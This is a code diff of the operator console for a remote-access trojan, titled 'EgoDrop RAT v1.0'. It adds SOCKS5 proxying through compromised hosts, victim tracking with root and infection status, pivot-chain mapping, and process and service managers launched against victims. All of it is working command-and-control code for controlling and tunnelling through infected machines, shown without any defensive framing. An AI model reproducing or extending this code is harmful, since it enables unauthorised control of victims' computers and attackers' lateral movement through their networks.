@@ -7,7 +7,12 @@ namespace EgoDrop
 {
     public partial class frmMain : Form
     {
+        private string m_szVersion = "v1.0";
+
         public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();
+        public Dictionary<string, clsLtnProxy> m_dicLtnProxy = new Dictionary<string, clsLtnProxy>();
+
+        private Dictionary<string, clsAgent> m_dicAgent = new Dictionary<string, clsAgent>();
 
         private clsSqlite m_sqlite { get; set; } //Sqlite object.
         private clsIniMgr m_iniMgr { get; set; } //IniMgr object.
@@ -47,24 +52,126 @@ namespace EgoDrop
         /// <returns>Victim object.</returns>
         private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;
 
+        /// <summary>
+        /// Check victim is Unix-like.
+        /// </summary>
+        /// <param name="item"></param>
+        /// <returns></returns>
         private bool fnbIsUnixLike(ListViewItem item) => !item.SubItems[7].Text.ToLower().Contains("windows");
 
         #endregion
-        #region Logger
+        #region Controls
+
+        #region Log
 
         /// <summary>
-        /// Display log message and write into database.
+        /// Write "Info" message.
         /// </summary>
         /// <param name="szMsg">Log message.</param>
-        public void fnSysLog(string szMsg)
+        public void fnSysLogInfo(string szMsg)
         {
-            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
+            richTextBox1.SelectionColor = Color.Goldenrod;
+            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+
+            richTextBox1.SelectionColor = Color.RoyalBlue;
+            richTextBox1.AppendText("[*] ");
+
+            richTextBox1.SelectionColor = Color.White;
+            richTextBox1.AppendText(szMsg);
+
+            richTextBox1.AppendText(Environment.NewLine);
+
+            //todo: Write log msg into database.
+        }
+
+        /// <summary>
+        /// Write "OK" message.
+        /// </summary>
+        /// <param name="szMsg"></param>
+        public void fnSysLogOK(string szMsg)
+        {
+            richTextBox1.SelectionColor = Color.Goldenrod;
+            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+
+            richTextBox1.SelectionColor = Color.LimeGreen;
+            richTextBox1.AppendText("[+] ");
+
+            richTextBox1.SelectionColor = Color.White;
+            richTextBox1.AppendText(szMsg);
+
+            richTextBox1.AppendText(Environment.NewLine);
+
+            //todo: Write log msg into database.
+        }
+
+        /// <summary>
+        /// Write "Error" message.
+        /// </summary>
+        /// <param name="szMsg"></param>
+        public void fnSysLogErr(string szMsg)
+        {
+            richTextBox1.SelectionColor = Color.Goldenrod;
+            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+
+            richTextBox1.SelectionColor = Color.Red;
+            richTextBox1.AppendText("[-] ");
+
+            richTextBox1.SelectionColor = Color.White;
+            richTextBox1.AppendText(szMsg);
+
             richTextBox1.AppendText(Environment.NewLine);
 
             //todo: Write log msg into database.
         }
 
         #endregion
+
+        /// <summary>
+        /// Refresh listener treeview.
+        /// </summary>
+        public void fnRefreshListenerTreeView()
+        {
+            treeView3.Nodes.Clear();
+
+            TreeNode nodeListener = new TreeNode("Server");
+            TreeNode nodeProxy = new TreeNode("Proxy");
+
+            treeView3.Nodes.AddRange(new TreeNode[]
+            {
+                nodeListener,
+                nodeProxy,
+            });
+
+            foreach (string szName in m_dicListener.Keys)
+            {
+                var ltn = m_dicListener[szName];
+                nodeListener.Nodes.Add(new TreeNode(szName));
+                nodeListener.Nodes[nodeListener.Nodes.Count - 1].Nodes.AddRange(new TreeNode[]
+                {
+                    new TreeNode($"Port[{ltn.m_stListener.nPort}]"),
+                    new TreeNode($"Protocol[{Enum.GetName(ltn.m_stListener.protoListener)}]"),
+                    new TreeNode($"Listening[{(ltn.m_bIsListening ? "True" : "False")}]"),
+                });
+            }
+
+            foreach (string szName in m_dicLtnProxy.Keys)
+            {
+                var ltn = m_dicLtnProxy[szName];
+                nodeProxy.Nodes.Add(new TreeNode(szName));
+                nodeProxy.Nodes[nodeProxy.Nodes.Count - 1].Nodes.AddRange(new TreeNode[]
+                {
+                    new TreeNode($"Port[{ltn.m_nPort}]"),
+                    new TreeNode($"Protocol[{Enum.GetName(ltn.m_enProtocol)}]"),
+                    new TreeNode($"Listening[{(ltn.m_bIsRunning ? "True" : "False")}]"),
+                });
+            }
+
+            nodeListener.Expand();
+            nodeProxy.Expand();
+        }
+
+        #endregion
+        #region Events
 
         /// <summary>
         /// New victim event handler.
@@ -118,16 +225,25 @@ namespace EgoDrop
                         item.SubItems.Add(lsMsg[6]);                    //uid.
                         item.SubItems.Add(lsMsg[7]);                    //root?
                         item.SubItems.Add(lsMsg[8]);                    //Operating system.
+                        item.SubItems.Add(lsMsg[9]);                    //CPU usage.
                         item.SubItems.Add(string.Empty);                //Active window title (if not null or empty).
 
                         item.Tag = victim;
 
                         listView1.Items.Add(item);
 
-                        fnSysLog($"New victim[{szID}]"); //Write new log message.
+                        fnSysLogOK($"New victim[{szID}]"); //Write new log message.
 
                         //todo: Add to group treeview.
 
+                    }
+                    else
+                    {
+                        ListViewItem item = listView1.FindItemWithText(szID);
+                        if (item == null)
+                            return;
+
+                        item.SubItems[8].Text = lsMsg[9];
                     }
                 }
                 else if (lsMsg[0] == "server")
@@ -149,12 +265,17 @@ namespace EgoDrop
                             //Change machine status.
                             switch (node.MachineStatus)
                             {
+                                #region Linux
+
                                 case NetworkView.enMachineStatus.Linux_Infected:
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                     break;
                                 case NetworkView.enMachineStatus.Linux_Super:
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                     break;
+
+                                #endregion
+                                #region Windows
 
                                 case NetworkView.enMachineStatus.Windows_Infected:
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
@@ -163,6 +284,9 @@ namespace EgoDrop
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
                                     break;
 
+                                #endregion
+                                #region MacOS
+
                                 case NetworkView.enMachineStatus.Mac_Infected:
 
                                     break;
@@ -170,12 +294,17 @@ namespace EgoDrop
 
                                     break;
 
+                                #endregion
+                                #region Webcam
+
                                 case NetworkView.enMachineStatus.Webcam_Infected:
 
                                     break;
                                 case NetworkView.enMachineStatus.Webcam_Super:
 
                                     break;
+
+                                    #endregion
                             }
                         }
                         else
@@ -211,6 +340,40 @@ namespace EgoDrop
                         else
                         {
                             clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
+                        }
+                    }
+                }
+                else if (lsMsg[0] == "proxy")
+                {
+                    if (lsMsg[1] == "socks5")
+                    {
+                        if (lsMsg[2] == "open")
+                        {
+                            int nCode = int.Parse(lsMsg[3]);
+                            int nStreamId = int.Parse(lsMsg[4]);
+
+                            if (nCode == 1)
+                            {
+                                fnOnProxyOpened(nStreamId, victim, szSrcVictimID);
+                            }
+                            else
+                            {
+                                fnOnProxyClosed(nStreamId, victim, szSrcVictimID);
+                            }
+                        }
+                        else if (lsMsg[2] == "close")
+                        {
+                            int nStreamId = int.Parse(lsMsg[3]);
+
+                            fnOnProxyClosed(nStreamId, victim, szSrcVictimID);
+                        }
+                        else if (lsMsg[2] == "data")
+                        {
+                            int nStreamId = int.Parse(lsMsg[3]);
+                            string szB64 = lsMsg[4];
+                            byte[] abBuffer = Convert.FromBase64String(szB64);
+
+                            fnOnProxyRecvVictimData(nStreamId, victim, szSrcVictimID, abBuffer);
                         }
                     }
                 }
@@ -256,12 +419,15 @@ namespace EgoDrop
                     if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)) && string.Equals(item.SubItems[1].Text, szVictimID))
                     {
                         listView1.Items.Remove(item);
-                        fnSysLog($"Offline[{szVictimID}]");
+                        fnSysLogInfo($"Offline[{szVictimID}]");
                     }
                 }
 
                 //Remove from treeview.
                 TreeNode tNode = fnFindNode(szVictimID);
+                if (tNode == null)
+                    return;
+
                 treeView2.Nodes.Remove(tNode);
 
                 //Remove from networkview.
@@ -269,19 +435,80 @@ namespace EgoDrop
                 networkView1.RemoveNode(node);
 
                 Node firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
+                if (firewallNode == null)
+                    return;
+
                 if (firewallNode.ChildNodes.Count == 0)
                     networkView1.RemoveNode(firewallNode);
 
                 vic.fnDeleteVictimChain(szVictimID);
+
+                //Check proxy
+                var ltns = m_dicLtnProxy.Keys.Select(x => m_dicLtnProxy[x]).Where(x => string.Equals(x.m_szVictimID, szVictimID)).ToList();
+                if (ltns.Count > 0)
+                {
+                    DialogResult dr = MessageBox.Show(
+                        $"Detected {ltns.Count} {(ltns.Count == 1 ? "proxy" : "proxies")} using the offlined Victim[{szVictimID}] as the endpoint, " +
+                        $"{(ltns.Count == 1 ? "this" : "these")} {(ltns.Count == 1 ? "is" : "are")} no longer available, " +
+                        $"do you want to remove {(ltns.Count == 1 ? "it" : "them")} ?",
+
+                        "Warning",
+                        MessageBoxButtons.YesNo,
+                        MessageBoxIcon.Warning,
+                        MessageBoxDefaultButton.Button2 //No
+                    );
+
+                    if (dr == DialogResult.Yes)
+                    {
+                        foreach (var ltn in ltns)
+                        {
+                            ltn.fnStop();
+                            m_dicLtnProxy.Remove(ltn.m_szName);
+
+                            fnSysLogInfo($"Removed proxy[{ltn.m_szName}]");
+                        }
+                    }
+                    else
+                    {
+                        foreach (var ltn in ltns)
+                        {
+                            ltn.fnStop();
+
+                            fnSysLogInfo($"Stopped proxy[{ltn.m_szName}]");
+                        }
+                    }
+                }
+
+                fnSysLogInfo($"Offline[{szVictimID}]");
+                fnRefreshListenerTreeView();
             }));
         }
 
         /// <summary>
-        /// Add victim chain.
+        /// 
         /// </summary>
+        /// <param name="listener"></param>
         /// <param name="lsVictim"></param>
-        public void fnOnAddChain(List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4)
+        /// <param name="szOS"></param>
+        /// <param name="szUsername"></param>
+        /// <param name="bRoot"></param>
+        /// <param name="szIPv4"></param>
+        /// <param name="enProtocol"></param>
+        public void fnOnAddChain(
+            clsListener listener,
+            clsVictim victim,
+            List<string> lsVictim,
+            string szOS,
+            string szUsername,
+            bool bRoot,
+            string szIPv4,
+            NetworkView.enConnectionType enProtocol
+        )
         {
+            bool fnbIsUnixlike(string szOS)
+            {
+                return !szOS.ToLower().Contains("windows");
+            }
             NetworkView.enMachineStatus fnGetStatusFromOS(string szOS)
             {
                 szOS = szOS.ToLower();
@@ -375,8 +602,8 @@ namespace EgoDrop
                         }
 
                         var n1 = networkView1.AddNode($"{szVictim}", $"{szUsername}@{szIPv4}", status);
+                        n1.Agent = new clsAgent(listener, victim, szVictim, fnbIsUnixlike(szOS));
 
-                        clsVictim victim = fnGetVictimWithID(szVictim);
                         victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);
 
                         fnAddTreeView(lsVictim, status);
@@ -387,7 +614,7 @@ namespace EgoDrop
                             if (networkView1.FindNodeWithName(szName) == null)
                             {
                                 var fireWall = networkView1.AddNode(szName, szName, NetworkView.enMachineStatus.Firewall);
-                                networkView1.AddConnection(fireWall, n1);
+                                networkView1.AddConnection(fireWall, n1, true, enProtocol);
                                 //networkView1.MoveNodeToLeft(fireWall);
                                 networkView1.BringGraphIntoView();
                             }
@@ -396,9 +623,7 @@ namespace EgoDrop
                         }
 
                         var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
-                        networkView1.AddConnection(nodeParent, n1);
-
-
+                        networkView1.AddConnection(nodeParent, n1, true, enProtocol);
                     }
                 }
                 catch (Exception ex)
@@ -407,6 +632,80 @@ namespace EgoDrop
                 }
             }));
         }
+
+        /// <summary>
+        /// Proxy server received endpoint's data.
+        /// </summary>
+        /// <param name="nStreamId"></param>
+        /// <param name="victim"></param>
+        /// <param name="szVictimID"></param>
+        /// <param name="abData"></param>
+        public void fnOnProxyRecvVictimData(int nStreamId, clsVictim victim, string szVictimID, byte[] abData)
+        {
+            foreach (string szName in m_dicLtnProxy.Keys)
+            {
+                try
+                {
+                    var ltnProxy = m_dicLtnProxy[szName];
+                    ltnProxy.fnOnRecvVictimData(ltnProxy, nStreamId, victim, szVictimID, abData);
+
+                    switch (ltnProxy.m_enProtocol)
+                    {
+                        case clsSqlite.enProxyProtocol.Socks5:
+                            ((clsLtnSocks5)ltnProxy).fnOnClientData(nStreamId, abData);
+                            break;
+                    }
+                }
+                catch
+                {
+
+                }
+            }
+        }
+
+        /// <summary>
+        /// Open the tunnel between proxy server and victim.
+        /// </summary>
+        /// <param name="nStreamId"></param>
+        /// <param name="victim"></param>
+        /// <param name="szVictimID"></param>
+        public void fnOnProxyOpened(int nStreamId, clsVictim victim, string szVictimID)
+        {
+            foreach (string szName in m_dicLtnProxy.Keys)
+            {
+                var ltnProxy = m_dicLtnProxy[szName];
+
+                switch (ltnProxy.m_enProtocol)
+                {
+                    case clsSqlite.enProxyProtocol.Socks5:
+                        ((clsLtnSocks5)ltnProxy).fnOnProxyOpened(nStreamId);
+                        break;
+                }
+            }
+        }
+
+        /// <summary>
+        /// Close the tunnel between proxy server and victim.
+        /// </summary>
+        /// <param name="nStreamId"></param>
+        /// <param name="victim"></param>
+        /// <param name="szVictimID"></param>
+        public void fnOnProxyClosed(int nStreamId, clsVictim victim, string szVictimID)
+        {
+            foreach (string szName in m_dicLtnProxy.Keys)
+            {
+                var ltnProxy = m_dicLtnProxy[szName];
+
+                switch (ltnProxy.m_enProtocol)
+                {
+                    case clsSqlite.enProxyProtocol.Socks5:
+                        ((clsLtnSocks5)ltnProxy).fnOnProxyClose(nStreamId);
+                        break;
+                }
+            }
+        }
+
+        #endregion
 
         private void fnSetup()
         {
@@ -432,6 +731,8 @@ namespace EgoDrop
 
             toolStripButton1.Checked = true;
             toolStripButton2.Checked = false;
+
+            timer1.Start();
         }
 
         private void frmMain_Load(object sender, EventArgs e)
@@ -445,6 +746,8 @@ namespace EgoDrop
             frmListener f = new frmListener(this, m_sqlite, m_dicListener);
 
             f.ShowDialog();
+
+            fnRefreshListenerTreeView();
         }
 
         //Builder
@@ -506,10 +809,13 @@ namespace EgoDrop
             {
                 string szVictimID = fnszGetVictimID(item);
                 clsVictim victim = fnGetVictimFromTag(item);
+
+                clsAgent agent = new clsAgent(victim.m_listener, victim, szVictimID, fnbIsUnixLike(item));
+
                 frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim, szVictimID);
                 if (f == null)
                 {
-                    f = new frmProcMgr(victim);
+                    f = new frmProcMgr(agent);
                     f.Show();
                 }
                 else
@@ -526,10 +832,12 @@ namespace EgoDrop
             {
                 string szVictimID = fnszGetVictimID(item);
                 clsVictim victim = fnGetVictimFromTag(item);
+                clsAgent agent = new clsAgent(victim.m_listener, victim, szVictimID, fnbIsUnixLike((item)));
+
                 frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim, szVictimID);
                 if (f == null)
                 {
-                    f = new frmSrvMgr(victim);
+                    f = new frmSrvMgr(agent);
                     f.Show();
                 }
                 else
@@ -582,24 +890,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
-            if (node == null)
-                return;
 
-            string szID = node.szVictimID;
-            if (string.IsNullOrEmpty(szID))
-                return;
-
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
-            if (item == null)
-                return;
-
-            clsVictim victim = fnGetVictimFromTag(item);
-
-            string szIPv4 = node.szDisplayName.Split('@').Last();
-
-            frmServerProxy f = new frmServerProxy(szID, victim, m_dicListener, szIPv4);
-            f.Show();
         }
 
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
@@ -724,16 +1015,22 @@ namespace EgoDrop
             }
         }
 
+        //Tree
         private void toolStripButton1_Click(object sender, EventArgs e)
         {
             toolStripButton1.Checked = true;
             toolStripButton2.Checked = false;
+
+            networkView1.NetworkViewTopoLogy = NetworkView.enTopologyLayout.Tree;
         }
 
+        //Pyramid
         private void toolStripButton2_Click(object sender, EventArgs e)
         {
             toolStripButton1.Checked = false;
             toolStripButton2.Checked = true;
+
+            networkView1.NetworkViewTopoLogy = NetworkView.enTopologyLayout.Pyramid;
         }
 
         private void toolStripMenuItem19_Click(object sender, EventArgs e)
@@ -807,6 +1104,83 @@ namespace EgoDrop
             {
                 f.BringToFront();
             }
+        }
+
+        private void toolStripMenuItem26_Click(object sender, EventArgs e)
+        {
+            frmProxy f = new frmProxy(this, m_sqlite);
+            f.Show();
+        }
+
+        private void toolStripMenuItem27_Click(object sender, EventArgs e)
+        {
+            Node node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            string szID = node.szVictimID;
+            if (string.IsNullOrEmpty(szID))
+                return;
+
+            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            if (item == null)
+                return;
+
+            clsVictim victim = fnGetVictimFromTag(item);
+
+            string szIPv4 = node.szDisplayName.Split('@').Last();
+
+            frmServerProxy f = new frmServerProxy(szID, victim, m_dicListener, szIPv4);
+            f.Show();
+        }
+
+        private void toolStripMenuItem28_Click(object sender, EventArgs e)
+        {
+            Node node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            string szID = node.szVictimID;
+            if (string.IsNullOrEmpty(szID))
+                return;
+
+            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            if (item == null)
+                return;
+
+            clsVictim victim = fnGetVictimFromTag(item);
+
+            frmProxy f = new frmProxy(this, m_sqlite, victim, szID, node.szDisplayName.Split('@').Last());
+            f.Show();
+
+            fnRefreshListenerTreeView();
+        }
+
+        private void frmMain_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            foreach (string szName in m_dicListener.Keys)
+                m_dicListener[szName].fnStop();
+
+            foreach (string szName in m_dicLtnProxy.Keys)
+                m_dicLtnProxy[szName].fnStop();
+        }
+
+        private void toolStripButton3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripButton3_CheckStateChanged(object sender, EventArgs e)
+        {
+            networkView1.DisplayProtocol = toolStripButton3.Checked;
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Text = $"EgoDrop RAT {m_szVersion} (by. ISSAC/iss4cf0ng) | " +
+                $"Agent[{listView1.Items.Count}] - Selected[{listView1.SelectedItems.Count}] | " +
+                $"Listener[{m_dicListener.Count}] | " +
+                $"Proxy[{m_dicLtnProxy.Count}]";
         }
     }
 }
